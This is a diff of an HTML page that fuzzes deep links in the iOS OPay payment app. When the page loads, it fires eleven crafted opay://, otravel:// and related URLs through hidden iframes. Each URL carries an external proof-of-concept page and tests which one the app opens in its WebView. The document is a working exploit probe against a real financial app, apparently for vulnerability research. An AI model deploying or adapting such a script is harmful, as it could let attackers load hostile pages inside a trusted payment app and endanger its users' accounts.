@@ -3,79 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPay Deep Link Tester</title>
+    <title>OPay Link Tester</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #222; color: #fff; text-align: center; padding: 20px; }
-        .btn { display: block; background: #00c853; color: #fff; padding: 15px; border-radius: 8px; font-weight: bold; text-decoration: none; margin-top: 10px; font-size: 14px; }
-        .log { background: #000; color: #00c853; padding: 10px; margin-top: 20px; text-align: left; font-family: monospace; font-size: 11px; height: 300px; overflow-y: scroll; border: 1px solid #444; }
-        .active { border: 2px solid yellow; background: #008f3a; }
+        body{font-family:-apple-system,sans-serif;background:#1a1a1a;color:#fff;padding:15px;font-size:13px;}
+        .btn{display:block;background:#00c853;color:#fff;padding:12px;border-radius:8px;font-weight:bold;text-decoration:none;margin:6px 0;font-size:13px;text-align:center;}
+        .tried{background:#555;}
+        #log{background:#000;color:#0f0;padding:10px;margin-top:15px;font-family:monospace;font-size:10px;height:250px;overflow-y:scroll;border:1px solid #333;word-break:break-all;}
+        h3{margin:0 0 10px;}
+        #status{color:#ff0;margin-bottom:10px;}
     </style>
 </head>
 <body>
-    <h3>OPay iOS Deep Link Fuzzer</h3>
-    <div id="status">Ready...</div>
+    <h3>iOS Deep Link Fuzzer</h3>
+    <div id="status">Tap any button or wait 3s for auto-run</div>
     <div id="btns"></div>
-    <div class="log" id="log"></div>
-
+    <div id="log"></div>
     <script>
-        var PAYLOAD = "https://zugonwobi.github.io/test/poc.html";
-        var variants = [
-            { name: "1. OTravel:scheme (Confirmed Launch)", url: "otravel://schemedispatcher?scheme=" + encodeURIComponent(PAYLOAD) },
-            { name: "2. OTravel:url (Alt Param)", url: "otravel://schemedispatcher?url=" + encodeURIComponent(PAYLOAD) },
-            { name: "3. OPay:webview (Common Pattern)", url: "opay://webview?url=" + encodeURIComponent(PAYLOAD) },
-            { name: "4. OPay:applink (Common Pattern)", url: "opay://applink?url=" + encodeURIComponent(PAYLOAD) },
-            { name: "5. OPay:web (Short Pattern)", url: "opay://web?url=" + encodeURIComponent(PAYLOAD) },
-            { name: "6. OPayPay:webview", url: "opaypay://webview?url=" + encodeURIComponent(PAYLOAD) },
-            { name: "7. OTravel:webview", url: "otravel://webview?url=" + encodeURIComponent(PAYLOAD) },
-            { name: "8. OTravel:open", url: "otravel://open?url=" + encodeURIComponent(PAYLOAD) },
-            { name: "9. UniLink: mkt.opayweb", url: "https://mkt.opayweb.com/proh5/?link=" + encodeURIComponent(PAYLOAD) },
-            { name: "10. UniLink: m.opayweb", url: "https://m.opayweb.com/webview?url=" + encodeURIComponent(PAYLOAD) },
-            { name: "11. opay-payment:webview", url: "opay-payment://webview?url=" + encodeURIComponent(PAYLOAD) }
-        ];
+    var P="https://zugonwobi.github.io/test/poc.html";
+    var V=[
+        ["1 otravel scheme=","otravel://schemedispatcher?scheme="+encodeURIComponent(P)],
+        ["2 otravel url=","otravel://schemedispatcher?url="+encodeURIComponent(P)],
+        ["3 opay webview","opay://webview?url="+encodeURIComponent(P)],
+        ["4 opay applink","opay://applink?url="+encodeURIComponent(P)],
+        ["5 opay web","opay://web?url="+encodeURIComponent(P)],
+        ["6 opaypay webview","opaypay://webview?url="+encodeURIComponent(P)],
+        ["7 otravel webview","otravel://webview?url="+encodeURIComponent(P)],
+        ["8 otravel open","otravel://open?url="+encodeURIComponent(P)],
+        ["9 opay browser","opay://browser?url="+encodeURIComponent(P)],
+        ["10 opay navigate","opay://navigate?url="+encodeURIComponent(P)],
+        ["11 opay-payment","opay-payment://webview?url="+encodeURIComponent(P)]
+    ];
+    var logEl=document.getElementById("log");
+    function log(m){var d=document.createElement("div");d.textContent="> "+m;logEl.appendChild(d);logEl.scrollTop=99999;}
 
-        var logDiv = document.getElementById("log");
-        var btnDiv = document.getElementById("btns");
+    function fire(url,label){
+        log("FIRING: "+label);
+        log("URL: "+url);
+        var f=document.createElement("iframe");
+        f.style.display="none";
+        f.src=url;
+        document.body.appendChild(f);
+        setTimeout(function(){try{document.body.removeChild(f);}catch(e){}},3000);
+    }
 
-        function log(msg) {
-            var d = document.createElement("div");
-            d.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
-            logDiv.appendChild(d);
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
+    var btns=document.getElementById("btns");
+    for(var i=0;i<V.length;i++){
+        (function(idx){
+            var a=document.createElement("a");
+            a.className="btn";
+            a.href="#";
+            a.textContent=V[idx][0];
+            a.onclick=function(e){e.preventDefault();fire(V[idx][1],V[idx][0]);a.className="btn tried";return false;};
+            btns.appendChild(a);
+        })(i);
+    }
 
-        variants.forEach(function(v, i) {
-            var a = document.createElement("a");
-            a.className = "btn";
-            a.id = "btn-" + i;
-            a.href = v.url;
-            a.innerText = v.name;
-            btnDiv.appendChild(a);
-        });
-
-        var currentIndex = 0;
-        function tryNext() {
-            if (currentIndex >= variants.length) {
-                log("Fuzzing complete.");
-                document.getElementById("status").innerText = "Fuzzing complete.";
-                return;
-            }
-
-            var v = variants[currentIndex];
-            log("Testing " + v.name + "...");
-            document.getElementById("status").innerText = "Testing " + v.name + "...";
-            
-            document.querySelectorAll(".btn").forEach(b => b.classList.remove("active"));
-            var btn = document.getElementById("btn-" + currentIndex);
-            if(btn) btn.classList.add("active");
-
-            window.location.href = v.url;
-
-            currentIndex++;
-            setTimeout(tryNext, 5000); 
-        }
-
-        log("Tap any button to start sequence or manual test.");
-        setTimeout(function() { log("Auto-starting fuzzer..."); tryNext(); }, 3000);
+    var ci=0;
+    function autoRun(){
+        if(ci>=V.length){log("== ALL DONE ==");document.getElementById("status").textContent="Done. Check which one opened WebView.";return;}
+        var v=V[ci];
+        document.getElementById("status").textContent="Testing "+v[0]+"...";
+        fire(v[1],v[0]);
+        var b=btns.children[ci];if(b)b.className="btn tried";
+        ci++;
+        setTimeout(autoRun,4000);
+    }
+    log("Ready. Auto-start in 3s...");
+    setTimeout(autoRun,3000);
     </script>
 </body>
 </html>
